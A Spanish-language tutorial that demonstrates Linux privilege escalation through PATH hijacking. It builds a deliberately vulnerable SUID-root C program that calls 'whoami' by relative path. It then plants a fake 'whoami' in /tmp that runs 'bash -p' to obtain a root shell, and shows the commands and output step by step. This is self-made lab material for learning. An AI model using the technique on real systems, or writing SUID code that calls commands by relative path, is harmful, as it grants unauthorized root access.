# Hijacking | Secuestro
El hijacking consiste en dueñarse o robar algo por parte de un atacante.

## Path hijacking

El path hijacking como su nombre lo indica, se refiere al secuestro del path. <br>

El PATH es una variable de entorno que contiene la dirección absoluta de los binarios que se ejecutarán respecto al usuario en sesión. <br>

## Ruta relativa | Ruta relativa

Ruta absoluta: <br>
- Se indica toda la ruta del archivo incluyendo el directorio raíz. Por ejemplo: <br>
```
/bin/ls
```
Ruta relativa: <br>
- se indica la ruta a partir de donde este en ese momento situado. Por ejemplo, si se ejecuta 'ls', la ruta será:
```
/usr/bin/ls
```

## El PATH

Para realizar la explotación de la vulnerabilidad se modificaré el PATH del sistema. <br>
El PATH contiene la información de la ruta, de las variables a las que se accede. <br>
Es el caso de la ruta relativa, cuando se ejecuta 'ls', el path hace referencia al binario ubicado en '/usr/bin/ls' <br>

## Vulnerabilidad

La explotación consciste en modificar el PATH, para que en lugar de ejecutar la ruta relativa, utilicé la ruta absoluta como root. <br>

Para este documentó se hará aprovechandose de un binario creado por root, y con persmisos SIUD.

## Creando binario SUID (set user id)

Crearemos nuestro propio binario que ejecutará un 'whoami' escrito en C. Llamado 'programa.c'

```
#include <stdio.h>

void main(){

   setuid(0);

   printf("Ejecutando con el usuario: (/usr/bin/whoami): ruta absoluta\n");
   system("/usr/bin/whoami");

   printf("Ejecutando con el usuario: (whoami): ruta realtiva\n");
   system("whoami");
}
```
El comando setuid(0), es porque por defecto, cuando se trata de escalar privilegios en programa escrito en C, deshabilita la posibilidad de escalar con el SUID 0, ya que es el de root.<br>
Entonces estableciendo ese comando, se pude realizar el escalamiento. <br>

Una vez creado, se compila. Se debe hacer con el usuario root, o posteriormente cambiar el propietario y el grupo al que pertenece.
```
# Sin ser el usuario root pero con permisos de sudo
gcc programa.c -o binario
sudo chown root:root binario
sudo chmod 4755 binario

# Siendo el usuario root
gcc programa.c -o binario
chmod 4755 binario
```
Y debería verse de la siguiente forma usando ls -la
```
-rwsrwxr-x. 1 root root 25224 Mar 30 18:11 binario
```

## Explotando vulnerabilidad - Path Hijacking & SUID

A través del programa export, se pueden definir la variables del sistema. <br>
Se utilizará export para modificar el PATH. <br>

Pero antes de hacerlo, debemos crear un fichero que contenga el comando con el que escalaremos aprovechando SUID. <br>

```
cd /tmp
touch whoami
chmod 755 whoami
echo "bash -p" > whoami
```
De esa forma nos devolverá una shell con privilegios de root. <br>
Ahora volvemos a la ruta del binario, y se modificará el PATH: <br>
```
cd -
export PATH=/tmp:$PATH
```
El comienzo del path, se debería ver de la siguiente forma usando echo $PATH
```
/tmp:/usr/local/bin ...
```

Se ejecuta el script:
```
./binario
```
Se debería mostrar lo siguiente:
```
Ejecutando con el usuario: (/usr/bin/whoami): ruta absoluta
root
Ejecutando con el usuario: (whoami): ruta realtiva
bash-5.0#
```
Si todo se realizó bien, en este punto ya se tiene acceso a root. <br>
Se puede compobar ejecutando:
```
whoami
touch file
la -la
```
Y la salida debería ser la siguiente
```
root
-rw-r--r--. 1 root tony     0 Mar 30 18:28 file
```
El fichero fué creado por el usuario root.

